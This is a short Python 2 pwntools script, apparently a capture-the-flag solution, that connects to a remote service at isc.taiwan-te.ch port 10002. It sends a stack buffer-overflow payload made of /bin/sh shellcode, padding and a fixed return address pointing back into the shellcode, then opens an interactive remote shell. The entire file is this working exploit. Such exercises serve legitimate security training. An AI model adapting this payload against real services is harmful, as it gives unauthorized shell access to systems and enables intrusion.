#!/usr/bin/env python2
from pwn import *
import pwnlib.shellcraft

#init
c = remote('isc.taiwan-te.ch', 10002)

context.os='linux'
context.arch='amd64'
# context.log_level ='debug'

ans = asm(shellcraft.sh()) # put shellcode to message
ans = ans + "\0"*(16 + 8)
ans = ans + p64(0x0000000000601060) # return to message
c.sendline(ans)

c.interactive()
c.close()
